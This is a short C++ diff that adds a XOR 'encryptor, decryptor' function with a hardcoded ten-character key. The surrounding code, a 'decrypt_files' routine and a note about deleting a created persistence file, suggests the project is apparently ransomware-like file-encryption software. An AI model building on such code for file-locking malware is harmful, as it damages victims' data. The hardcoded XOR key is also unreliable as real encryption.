@@ -22,3 +22,18 @@ vector<wstring> decrypt_files(wstring path)
 	// TODO: Delete persistance file created
 	return matches;
 }
+
+// XOR encryptor, decryptor
+string encryptDecrypt(string toEncrypt)
+{
+	char key[10] = { 'A', '2', 'G', '6', 'J', 'L', 'C', 'C', 'Q', 'P' };
+	string output = toEncrypt;
+	int k_size = (sizeof(key) / sizeof(char));
+
+	for (int i = 0; i < toEncrypt.size(); i++)
+	{
+		output[i] = toEncrypt[i] ^ key[i % k_size];
+	}
+
+	return output;
+}
